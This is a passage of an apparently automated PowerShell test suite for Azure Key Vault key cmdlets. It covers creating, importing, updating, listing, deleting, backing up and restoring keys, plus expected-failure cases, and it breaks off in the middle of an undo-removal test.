$pfxpwd='123'
$securepfxpwd=$pfxpwd | ConvertTo-SecureString -AsPlainText -Force
$expires= (Get-Date).AddYears(2).ToUniversalTime()
$nbf=(Get-Date).ToUniversalTime()
$newexpires= (Get-Date).AddYears(5).ToUniversalTime()
$newnbf=(Get-Date).AddYears(1).ToUniversalTime()
$ops =  "decrypt", "verify"   
$newops = "encrypt", "decrypt", "sign"
$delta=[TimeSpan]::FromMinutes(2)
$tags=@{"tag1"="value1"; "tag2"=""; "tag3"=$null}
$newtags= @{"tag1"="value1"; "tag2"="value2"; "tag3"="value3"; "tag4"="value4"}
$emptytags=@{}
$defaultKeySizeInBytes = 256



function Assert-KeyAttributes($keyAttr, $keytype, $keyenable, $keyexp, $keynbf, $keyops, $tags)
{
    Assert-NotNull $keyAttr, "keyAttr is null."
    Assert-AreEqual $keytype $keyAttr.KeyType "Expect $keytype. Get $keyAttr.KeyType"
    Assert-AreEqual $keyenable $keyAttr.Enabled "Expect $keyenable. Get $keyAttr.Enabled"
    if ($keyexp -ne $null)
    {   
        Assert-True { Equal-DateTime  $keyexp $keyAttr.Expires } "Expect $keyexp. Get $keyAttr.Expires"
    }  
    if ($keynbf -ne $null)
    {
         Assert-True { Equal-DateTime  $keynbf $keyAttr.NotBefore} "Expect $keynbf. Get $keyAttr.NotBefore"
    }     
    if ($keyops -ne $null)
    {
         Assert-True { Equal-OperationList  $keyops $keyAttr.KeyOps} "Expect $keyops. Get $keyAttr.KeyOps"
    } 
    Assert-True { Equal-Hashtable $tags $keyAttr.Tags} "Expected $tags. Get $keyAttr.Tags"
	Assert-NotNull $keyAttr.RecoveryLevel, "Deletion recovery level is null."
}

function BulkCreateSoftKeys ($vault, $prefix, $total)
{
    for ($i=0;$i -lt $total; $i++) 
    { 
        $name = $prefix+$i; 
        $k=Add-AzKeyVaultKey -VaultName $Vault -Name $name -Destination 'Software'
        Assert-NotNull $k
        $global:createdKeys += $name
    }
 }

function BulkCreateSoftKeyVersions ($vault, $name, $total)
{
    for ($i=0;$i -lt $total; $i++) 
    { 
        $k=Add-AzKeyVaultKey -VaultName $Vault -Name $name -Destination 'Software'
        Assert-NotNull $k       
    }
    $global:createdKeys += $name
 }
 


function Test_CreateSoftwareKeyWithDefaultAttributes
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'soft'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' 
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA' $true $null $null $null $null
	Assert-AreEqual $key.Key.N.Length $defaultKeySizeInBytes
}


function Test_CreateSoftwareKeyWithCustomAttributes
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'attr'    
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA' $false $expires $nbf $ops $tags
}


function Test_CreateHsmKeyWithDefaultAttributes
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'hsm'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'HSM'
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA-HSM' $true $null $null $null $null
	Assert-AreEqual $key.Key.N.Length $defaultKeySizeInBytes
}


function Test_CreateHsmKeyWithCustomAttributes
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'attrhsm'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'HSM' -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA-HSM' $false $expires $nbf $ops $tags
}


function Test_ImportPfxWithDefaultAttributes
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'pfx'
    $pfxpath = Get-ImportKeyFile 'pfx'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -KeyFilePath $pfxpath -KeyFilePassword $securepfxpwd
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA' $true $null $null $null $null
	Assert-AreEqual $key.Key.N.Length $defaultKeySizeInBytes
 }

 
function Test_ImportPfxWith1024BitKey
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'pfx1024'
    $pfxpath = Get-ImportKeyFile1024 'pfx'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -KeyFilePath $pfxpath -KeyFilePassword $securepfxpwd
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA' $true $null $null $null $null
	Assert-AreEqual $key.Key.N.Length 128
 }


function Test_ImportPfxWithCustomAttributes
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'attrpfx'   
    $pfxpath = Get-ImportKeyFile 'pfx'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -KeyFilePath $pfxpath -KeyFilePassword $securepfxpwd -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA' $false $expires $nbf $ops $tags
}


function Test_ImportPfxAsHsmWithDefaultAttributes
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'pfxashsm'   
    $pfxpath = Get-ImportKeyFile 'pfx'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'HSM' -KeyFilePath $pfxpath -KeyFilePassword $securepfxpwd
    Assert-NotNull $key           
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA-HSM' $true $null $null $null $null
}


function Test_ImportPfxAsHsmWithCustomAttributes
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'attrpfxashsm'   
    $pfxpath = Get-ImportKeyFile 'pfx'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'HSM' -KeyFilePath $pfxpath -KeyFilePassword $securepfxpwd -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA-HSM' $false $expires $nbf $ops $tags
}


function Test_ImportByokWithDefaultAttributes
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'byok'   
    $byokpath = Get-ImportKeyFile 'byok'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -KeyFilePath $byokpath
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA-HSM' $true $null $null $null $null
	Assert-AreEqual $key.Key.N.Length $defaultKeySizeInBytes
}


function Test_ImportByokWith1024BitKey
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'byok1024'   
    $byokpath = Get-ImportKeyFile1024 'byok'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -KeyFilePath $byokpath
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA-HSM' $true $null $null $null $null
	Assert-AreEqual $key.Key.N.Length 128
}


function Test_ImportByokWithCustomAttributes
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'attrbyok'   
    $byokpath = Get-ImportKeyFile 'byok'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'HSM' -KeyFilePath $byokpath -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key                 
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA-HSM' $false $expires $nbf $ops $tags
}


function Test_AddKeyPositionalParameter
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'positional'   
    $key=Add-AzKeyVaultKey $keyVault $keyname -Destination 'Software'
    Assert-NotNull $key                 
    $global:createdKeys += $keyname    
}


function Test_AddKeyAliasParameter
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'alias'   
    $key=Add-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname -Destination 'Software'
    Assert-NotNull $key                 
    $global:createdKeys += $keyname    
}



function Test_ImportNonExistPfxFile
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'nonexistpfx'   
    $nonexistpfx = Get-ImportKeyFile 'pfx' $false
    Assert-Throws {Add-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname -KeyFilePath $nonexistpfx -KeyFilePassword $securepfxpwd}
}


function Test_ImportPfxFileWithIncorrectPassword
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'wrongpwdpfx'   
    $pfxpath = Get-ImportKeyFile 'pfx'     
    $wrongpwd= 'foo' | ConvertTo-SecureString -AsPlainText -Force
    Assert-Throws {Add-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname -Name $keyname -KeyFilePath $pfxpath -KeyFilePassword $wrongpwd}
}


function Test_ImportNonExistByokFile
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'nonexistbyok'   
    $nonexistbyok = Get-ImportKeyFile 'byok' $false
    Assert-Throws {Add-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname -KeyFilePath $nonexistbyok}
}


function Test_CreateKeyInNonExistVault
{
    $keyVault = 'notexistvault'
    $keyname= 'notexitkey'
    Assert-Throws {Add-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname -Destination 'Software'}
}


function Test_ImportByokAsSoftwareKey
{
    $keyVault = Get-KeyVault
    $keyname= Get-KeyName 'byokassoftware'
    Assert-Throws {Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -KeyFilePath $byokpath}
}


function Test_CreateKeyInNoPermissionVault
{
    $keyVault = Get-KeyVault $false
    $keyname= Get-KeyName 'nopermission'
        Assert-Throws {Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'}
}



function Test_UpdateIndividualKeyAttributes
{
    
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'updatesoft'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA' $false $expires $nbf $ops $tags

    
    $key=Set-AzKeyVaultKeyAttribute -VaultName $keyVault -Name $keyname -Expires $newexpires -PassThru
    Assert-NotNull $key
    Assert-KeyAttributes $key.Attributes 'RSA' $false $newexpires $nbf $ops $tags

    
    $key=Set-AzKeyVaultKeyAttribute -VaultName $keyVault -Name $keyname -NotBefore $newnbf -PassThru
    Assert-NotNull $key
    Assert-KeyAttributes $key.Attributes 'RSA' $false $newexpires $newnbf $ops $tags

    
    $key=Set-AzKeyVaultKeyAttribute -VaultName $keyVault -Name $keyname -KeyOps $newops -PassThru
    Assert-NotNull $key
    Assert-KeyAttributes $key.Attributes 'RSA' $false $newexpires $newnbf $newops $tags

    
    $key=Set-AzKeyVaultKeyAttribute -VaultName $keyVault -Name $keyname -Enable $true -PassThru
    Assert-NotNull $key
    Assert-KeyAttributes $key.Attributes 'RSA' $true $newexpires $newnbf $newops $tags
    
    
    $key=Set-AzKeyVaultKeyAttribute -VaultName $keyVault -Name $keyname -Tag $newtags -PassThru
    Assert-NotNull $key
    Assert-KeyAttributes $key.Attributes 'RSA' $true $newexpires $newnbf $newops $newtags
    
    
    $key=Set-AzKeyVaultKeyAttribute -VaultName $keyVault -Name $keyname -Tag $emptytags -PassThru
    Assert-NotNull $key
    Assert-KeyAttributes $key.Attributes 'RSA' $true $newexpires $newnbf $newops $emptytags    
}


function Test_UpdateKeyWithNoChange
{
    
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'updatesoftnochange'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -Expires $expires -NotBefore $nbf -KeyOps $ops -Tag $tags
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA' $true $expires $nbf $ops $tags

    
    $key=Set-AzKeyVaultKeyAttribute -VaultName $keyVault -Name $keyname -PassThru
    Assert-NotNull $key
    Assert-KeyAttributes $key.Attributes 'RSA' $true $expires $nbf $ops $tags
}


function Test_UpdateAllEditableKeyAttributes
{
    
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'usoft'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA' $false $expires $nbf $ops $tags

    
    $key=Set-AzKeyVaultKeyAttribute -VaultName $keyVault -Name $keyname -Expires $newexpires  -NotBefore $newnbf -KeyOps $newops -Enable $true -Tag $newtags -PassThru   
    Assert-KeyAttributes $key.Attributes 'RSA' $true $newexpires $newnbf $newops $newtags
    if($global:standardVaultOnly -eq $false)
    {
       
      $keyname=Get-KeyName 'uhsm'
      $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'HSM' -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
      Assert-NotNull $key
      $global:createdKeys += $keyname
      Assert-KeyAttributes $key.Attributes 'RSA-HSM' $false $expires $nbf $ops $tags

      
      $key=Set-AzKeyVaultKeyAttribute -VaultName $keyVault -Name $keyname -Expires $newexpires  -NotBefore $newnbf -KeyOps $newops -Enable $true -Tag $newtags -PassThru
      Assert-KeyAttributes $key.Attributes 'RSA-HSM' $true $newexpires $newnbf $newops $newtags
    }
}



function Test_SetKeyPositionalParameter
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'positional'   
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' 
    Assert-NotNull $key                 
    $global:createdKeys += $keyname    

    Set-AzKeyVaultKeyAttribute $keyVault $keyname -Expires $newexpires  -NotBefore $newnbf -Enable $true -PassThru   
}


function Test_SetKeyAliasParameter
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'alias'   
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key                 
    $global:createdKeys += $keyname    

    Set-AzKeyVaultKeyAttribute -VaultName $keyVault -KeyName $keyname -Expires $newexpires  -NotBefore $newnbf -Enable $true  -PassThru  
}


function Test_SetKeyVersion
{
    
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'version'   
    
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key        
    $v1=$key.Version
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA' $false $expires $nbf $ops $tags
    
    
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key   
    $v2=$key.Version    
    Assert-KeyAttributes $key.Attributes 'RSA' $false $expires $nbf $ops $tags
         
    
    Set-AzKeyVaultKeyAttribute -VaultName $keyVault -Name $keyname -Version $v1 -Expires $newexpires  -NotBefore $newnbf -KeyOps $newops -Enable $true -Tag $newtags  -PassThru
    
    
    $key=Get-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Version $v1
    Assert-NotNull $key
    Assert-KeyAttributes $key.Attributes 'RSA' $true $newexpires $newnbf $newops $newtags
            
    
    $key=Get-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Version $v2
    Assert-NotNull $key
    Assert-KeyAttributes $key.Attributes 'RSA' $false $expires $nbf $ops $tags
    
    
    $key=Get-AzKeyVaultKey -VaultName $keyVault -Name $keyname
    Assert-NotNull $key
    Assert-KeyAttributes $key.Attributes 'RSA' $false $expires $nbf $ops $tags  
    
    
    Set-AzKeyVaultKeyAttribute $keyVault $keyname $v1 -Expires $expires -NotBefore $nbf -KeyOps $ops -Enable $false -Tag $tags -PassThru
    $key=Get-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Version $v1
    Assert-NotNull $key
    Assert-KeyAttributes $key.Attributes 'RSA' $false $expires $nbf $ops $tags    
}



function Test_SetKeyInNonExistVault
{
    $keyVault = 'notexistvault'
    $keyname=Get-KeyName 'nonexist'   
    Assert-Throws {Set-AzKeyVaultKeyAttribute -VaultName $keyVault -KeyName $keyname -Enable $true}
}



function Test_GetKeyInABadVault
{
    $keyName = Get-CertificateName 'nonexist'
    Assert-Throws { Get-AzKeyVaultKey '$vaultName' $keyName }
}


function Test_SetNonExistKey
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'nonexist'   
    Assert-Throws {Set-AzKeyVaultKeyAttribute -VaultName $keyVault -KeyName $keyname -Enable $true}
}


function Test_SetInvalidKeyAttributes
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'invalidattr'   
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key                 
    $global:createdKeys += $keyname    

    Assert-Throws {Set-AzKeyVaultKeyAttribute -VaultName $keyVault -KeyName $keyname -Expires $nbf  -NotBefore $expires }
}


function Test_SetKeyInNoPermissionVault
{
    $keyVault = Get-KeyVault $false
    $keyname= Get-KeyName 'nopermission'
    Assert-Throws {Set-AzKeyVaultKeyAttribute -VaultName $keyVault -Name $keyname -Enable $true}
}




function Test_GetOneKey
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'getone'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key
    $global:createdKeys += $keyname
    Assert-KeyAttributes $key.Attributes 'RSA' $true $null $null $null

    $key=Get-AzKeyVaultKey -VaultName $keyVault -Name $keyname
    Assert-KeyAttributes $key.Attributes 'RSA' $true $null $null $null
}



function Test_GetAllKeys
{
    $keyVault = Get-KeyVault
    $keypartialname=Get-KeyName 'get'
        
    $total=10
    $run = 5
    $i = 1
    do {
      Write-Host "Sleep 5 seconds before creating another $total keys"
      Wait-Seconds 5
      BulkCreateSoftKeys $keyVault $keypartialname $total
      $i++
    } while ($i -le $run)
        
    $keys=Get-AzKeyVaultKey -VaultName $keyVault 
    Assert-True { $keys.Count -ge $total }
}



function Test_GetPreviousVersionOfKey
{
    $keyOperation = 'encrypt'

    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'getversion'
    $key1=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -Disable -NotBefore $nbf -Expires $expires -KeyOps $ops 

    $global:createdKeys += $keyname 
    Assert-KeyAttributes -keyAttr $key1.Attributes -keytype 'RSA' -keyenable $false -keyexp $expires -keynbf $nbf -keyops $ops 

    $key2=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-KeyAttributes $key2.Attributes 'RSA' $true $null $null $null

    $key3=Get-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Version $key1.Version
    Assert-KeyAttributes -keyAttr $key3.Attributes -keytype 'RSA' -keyenable $false -keyexp $expires -keynbf $nbf -keyops $ops 
    
    $key4=Get-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Version $key2.Version
    Assert-KeyAttributes $key4.Attributes 'RSA' $true $null $null $null
}



function Test_GetKeyVersions
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'getversions'
    
    $total=10
    $run = 5
    $i = 1
    do {
      Write-Host "Sleep 5 seconds before creating another $total keys"
      Wait-Seconds 5
      BulkCreateSoftKeyVersions $keyVault $keyname $total          
      $i++
    } while ($i -le $run)
           
    $keys=Get-AzKeyVaultKey -VaultName $keyVault -Name $keyname -IncludeVersions
    Assert-True { $keys.Count -ge $total*$run }
}


function Test_GetKeyPositionalParameter
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'positional'   
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key                 
    $global:createdKeys += $keyname    

    $key=Get-AzKeyVaultKey $keyVault $keyname
    Assert-NotNull $key                     
}


function Test_GetKeyAliasParameter
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'alias'   
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key                 
    $global:createdKeys += $keyname    

    $key=Get-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname 
    Assert-NotNull $key     
}


function Test_GetKeysInNonExistVault
{
    $keyVault = 'notexistvault'
    Assert-Throws {Get-AzKeyVaultKey -VaultName $keyVault}
}


function Test_GetNonExistKey
{
    $keyVault = Get-KeyVault
    $keyname = 'notexist'
    $key = Get-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname
    Assert-Null $key
}


function Test_GetKeyInNoPermissionVault
{
    $keyVault = Get-KeyVault $false
    Assert-Throws {Get-AzKeyVaultKey -VaultName $keyVault}
}



function Test_RemoveKeyWithoutPrompt
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'remove'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key
    $global:createdKeys += $keyname
    
    $key=Remove-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Force -Confirm:$false -PassThru
    Assert-NotNull $key
    
    $key = Get-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname
    Assert-Null $key
}


function Test_RemoveKeyWhatIf
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'whatif'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key
    $global:createdKeys += $keyname
    
    Remove-AzKeyVaultKey -VaultName $keyVault -Name $keyname  -WhatIf -Force
    
    $key=Get-AzKeyVaultKey -VaultName $keyVault -Name $keyname
    Assert-NotNull $key    
}


function Test_RemoveKeyPositionalParameter
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'positional'   
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key                 
    $global:createdKeys += $keyname    

    Remove-AzKeyVaultKey $keyVault $keyname -Force -Confirm:$false      
    
    $key = Get-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname
    Assert-Null $key                 
}


function Test_RemoveKeyAliasParameter
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'alias'   
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key                 
    $global:createdKeys += $keyname    

    Remove-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname  -Force -Confirm:$false                
	
    $key = Get-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname
    Assert-Null $key
}


function Test_RemoveKeyInNonExistVault
{
    $keyVault = 'notexistvault'
    $keyname = 'notexist'
    Assert-Throws {Remove-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Force -Confirm:$false}
}


function Test_RemoveNonExistKey
{
    $keyVault = Get-KeyVault
    $keyname = 'notexist'
    Assert-Throws {Remove-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Force -Confirm:$false}
}


function Test_RemoveKeyInNoPermissionVault
{
    $keyVault = Get-KeyVault $false
    $keyname= Get-KeyName 'nopermission'
    Assert-Throws {Remove-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Enable $true -Force -Confirm:$false}
}


function Test_BackupRestoreKeyByName
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'backuprestore'   
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key                 
    $global:createdKeys += $keyname

    $backupblob = Backup-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname       
    
    Cleanup-Key $keyname
    Wait-Seconds 30 
    $restoredKey = Restore-AzKeyVaultKey -VaultName $keyVault -InputFile $backupblob
    Assert-KeyAttributes $restoredKey.Attributes 'RSA' $true $null $null $null
}


function Test_BackupRestoreKeyByRef
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'backuprestore'   
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key                 
    $global:createdKeys += $keyname

    $backupblob = Backup-AzKeyVaultKey -Key $key
    Remove-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Force -Confirm:$false
    $restoredKey = Restore-AzKeyVaultKey -VaultName $keyVault -InputFile $backupblob
    Assert-KeyAttributes $restoredKey.Attributes 'RSA' $true $null $null $null
}


function Test_BackupNonExistingKey
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'backupnonexisting'

    Assert-Throws { Backup-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname }
}


function Test_BackupKeyToANamedFile
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'backupnamedfile'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key                 
    $global:createdKeys += $keyname
  
    $backupfile='.\backup' + ([GUID]::NewGuid()).GUID.ToString() + '.blob'
 
    Backup-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname -OutputFile $backupfile
	
    Cleanup-Key $keyname
	Wait-Seconds 30 
    $restoredKey = Restore-AzKeyVaultKey -VaultName $keyVault -InputFile $backupfile
    Assert-KeyAttributes $restoredKey.Attributes 'RSA' $true $null $null $null
}


function Test_BackupKeyToExistingFile
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'backupexistingfile'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software'
    Assert-NotNull $key                 
    $global:createdKeys += $keyname
  
    $backupfile='.\backup' + ([GUID]::NewGuid()).GUID.ToString() + '.blob'
 
    Backup-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname -OutputFile $backupfile        
    Backup-AzKeyVaultKey -VaultName $keyVault -KeyName $keyname -OutputFile $backupfile -Force -Confirm:$false
}



function Test_RestoreKeyFromNonExistingFile
{
    $keyVault = Get-KeyVault

    Assert-Throws { Restore-AzKeyVaultKey -VaultName $keyVault -InputFile c:\nonexisting.blob }
}



function Test_PipelineUpdateKeys
{
    $keyVault = Get-KeyVault
    $keypartialname=Get-KeyName 'pipeupdate'
    $total=2
    BulkCreateSoftKeys $keyVault $keypartialname $total  
    
    Get-AzKeyVaultKey $keyVault |  Where-Object {$_.KeyName -like $keypartialname+'*'}  | Set-AzKeyVaultKeyAttribute -Enable $false	

    Get-AzKeyVaultKey $keyVault |  Where-Object {$_.KeyName -like $keypartialname+'*'}  |  ForEach-Object {  Assert-False { return $_.Enabled } }
}
 
 

function Test_PipelineUpdateKeyVersions
{
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'pipeupdateversion'
    $total=2    
    BulkCreateSoftKeyVersions $keyVault $keyname $total
    
    Get-AzKeyVaultKey $keyVault $keyname -IncludeVersions | Set-AzKeyVaultKeyAttribute -Enable $false
    Get-AzKeyVaultKey $keyVault $keyname -IncludeVersions |  ForEach-Object {  Assert-False { return $_.Enabled } }
    
    Get-AzKeyVaultKey $keyVault $keyname -IncludeVersions | Set-AzKeyVaultKeyAttribute -Tag $newtags
    Get-AzKeyVaultKey $keyVault $keyname -IncludeVersions |  ForEach-Object {  Assert-True { return $_.Tags.Count -eq $newtags.Count } }
 }




function Test_PipelineRemoveKeys
{
    $keyVault = Get-KeyVault
    $keypartialname=Get-KeyName 'piperemove'
    $total=2
    BulkCreateSoftKeys $keyVault $keypartialname $total   

    Get-AzKeyVaultKey $keyVault |  Where-Object {$_.KeyName -like $keypartialname+'*'}  | Remove-AzKeyVaultKey -Force -Confirm:$false

    $keys = Get-AzKeyVaultKey $keyVault |  Where-Object {$_.KeyName -like $keypartialname+'*'} 
    Assert-AreEqual $keys.Count 0     
}



function Test_GetDeletedKey
{
    
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'GetDeletedKey'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key
    $global:createdKeys += $keyname

    $key | Remove-AzKeyVaultKey -Force -Confirm:$false

    Wait-ForDeletedKey $keyVault $keyname

    $deletedKey = Get-AzKeyVaultKey -VaultName $keyVault -Name $keyname -InRemovedState
    Assert-NotNull $deletedKey
    Assert-NotNull $deletedKey.DeletedDate
    Assert-NotNull $deletedKey.ScheduledPurgeDate
}


function Test_GetDeletedKeys
{
	$keyVault = Get-KeyVault
    $keyname=Get-KeyName 'GetDeletedKeys'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key
    $global:createdKeys += $keyname

	$key | Remove-AzKeyVaultKey -Force -Confirm:$false

	Wait-ForDeletedKey $keyVault $keyname

	$deletedKeys = Get-AzKeyVaultKey -VaultName $keyVault -InRemovedState
	Assert-True {$deletedKeys.Count -ge 1}
    Assert-True {$deletedKeys.Name -contains $key.Name}
}



function Test_UndoRemoveKey
{
	
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'UndoRemoveKey'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key
    $global:createdKeys += $keyname

